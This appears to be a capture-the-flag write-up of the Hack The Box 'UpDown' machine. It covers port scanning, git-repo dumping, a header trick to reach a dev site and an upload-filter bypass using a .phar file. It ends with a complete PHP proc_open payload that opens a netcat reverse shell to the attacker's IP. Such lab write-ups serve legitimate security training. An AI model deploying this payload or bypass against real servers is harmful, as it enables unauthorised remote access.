## RUSTSCAN
`PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 9e1f98d7c8ba61dbf149669d701702e7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDl7j17X/EWcm1MwzD7sKOFZyTUggWH1RRgwFbAK+B6R28x47OJjQW8VO4tCjTyvqKBzpgg7r98xNEykmvnMr0V9eUhg6zf04GfS/gudDF3Fbr3XnZOsrMmryChQdkMyZQK1HULbqRij1tdHaxbIGbG5CmIxbh69mMwBOlinQINCStytTvZq4btP5xSMd8pyzuZdqw3Z58ORSnJAorhBXAmVa9126OoLx7AzL0aO3lqgWjo/wwd3FmcYxAdOjKFbIRiZK/f7RJHty9P2WhhmZ6mZBSTAvIJ36Kb4Z0NuZ+ztfZCCDEw3z3bVXSVR/cp0Z0186gkZv8w8cp/ZHbtJB/nofzEBEeIK8gZqeFc/hwrySA6yBbSg0FYmXSvUuKgtjTgbZvgog66h+98XUgXheX1YPDcnUU66zcZbGsSM1aw1sMqB1vHhd2LGeY8UeQ1pr+lppDwMgce8DO141tj+ozjJouy19Tkc9BB46FNJ43Jl58CbLPdHUcWeMbjwauMrw0=
|   256 c21cfe1152e3d7e5f759186b68453f62 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKMJ3/md06ho+1RKACqh2T8urLkt1ST6yJ9EXEkuJh0UI/zFcIffzUOeiD2ZHphWyvRDIqm7ikVvNFmigSBUpXI=
|   256 5f6e12670a66e8e2b761bec4143ad38e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL1VZrZbtNuK2LKeBBzfz0gywG4oYxgPl+s5QENjani1
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Is my Website up ?
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port`

* * *
## HTTP
Loggin into website we see that website's real URL should be:
![378ccf32f63609fd2bb8c66936408cc4.png](../../_resources/378ccf32f63609fd2bb8c66936408cc4.png)

Now adding it to our hosts file and running a subdomain enumeration we found another subdomain:
![7ce971511b8e17fbc09e68684b46c7e0.png](../../_resources/7ce971511b8e17fbc09e68684b46c7e0.png)

No webdirectories have been found on the dev subdomain:
![4459368ff1a03e4c5746192a19be134f.png](../../_resources/4459368ff1a03e4c5746192a19be134f.png)

We found only one directory on the main website:
![3664de67a6ffa15a18674cdf5504a6a2.png](../../_resources/3664de67a6ffa15a18674cdf5504a6a2.png)

And recursing /dev folder on main website we find traces about a git repo:
![c773b57d1170351e8719bb7d599b220f.png](../../_resources/c773b57d1170351e8719bb7d599b220f.png)

And dumping the repo from http://siteisup.htb/dev with git-dumper we get some interesting data:
![ec008f3dc03744851110bed0fbae518a.png](../../_resources/ec008f3dc03744851110bed0fbae518a.png)

Checking git logs we can see some interersting data:
![005fbfe51cff15482ec49b0672d9bd28.png](../../_resources/005fbfe51cff15482ec49b0672d9bd28.png)

Surfing all those files didn't shows us that much except the .htaccess:
![8136c724c2e764c6cb403732b0b3cce2.png](../../_resources/8136c724c2e764c6cb403732b0b3cce2.png)

Checkign the code i guess to access http://dev.siteisup.htb/ we need to have `Special-Dev: "only4dev"`  in the header, that's why the vhost is not showing anything.
Now easiest is to add a "match & replace" rule that requests for a new Header with `Special-Dev: "only4dev"` as replace, like this:
![78e55fd6da42d278410f2a34dde1e114.png](../../_resources/78e55fd6da42d278410f2a34dde1e114.png)

Next time we refresh the site via Burpsuite it will load the dev-website:
![b83499c934af0ea7db5424f7b72f1f07.png](../../_resources/b83499c934af0ea7db5424f7b72f1f07.png)

We know by checking the source code from index.php that we got from git repository, we can see how a size check should be less that 10kb and only some file formats are allowed:
![b44a70aa28ce69e8813f07532f86274c.png](../../_resources/b44a70aa28ce69e8813f07532f86274c.png)

We can find here good tips on how to bypass this controls:
https://book.hacktricks.xyz/pentesting-web/file-upload

To bypass file we can use phtm format since it's not blacklisted but seems like file get's deleted after parsing:
![3af3cd83d0aa8fac6bbf10c2dc7cc369.png](../../_resources/3af3cd83d0aa8fac6bbf10c2dc7cc369.png)

What can we do is to generate 200 random URL string and add them to our file in the head so we buy us some time before file get's delete. We can create a info.phar and se what can we get:
![d6d35c40f386a05a6bc8e31e94a1f538.png](../../_resources/d6d35c40f386a05a6bc8e31e94a1f538.png)

Checking into phpinfo all of the php functions used by revshells are blocked, so we need to use something other like proc_open:
https://prototype.php.net/manual/en/function.proc-open.php

Here is our code that run a revshell:
`┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads/updown.htb]
└─# cat shelly.phar
<?php
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("file", "/tmp/error-output.txt", "a") // stderr is a file to write to
);
$process = proc_open("sh", $descriptorspec, $pipes);
if (is_resource($process)) {
    // $pipes now looks like this:
    // 0 => writeable handle connected to child stdin
    // 1 => readable handle connected to child stdout
    // Any error output will be appended to /tmp/error-output.txt

    fwrite($pipes[0], "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.7 5555 >/tmp/f");
    fclose($pipes[0]);

    while (!feof($pipes[1])) {
        echo fgets($pipes[1], 1024);
    }
    fclose($pipes[1]);
    // It is important that you close any pipes before calling
    // proc_close in order to avoid a deadlock
    $return_value = proc_close($process);

    echo "command returned $return_value\n";
}
?>`







* * *
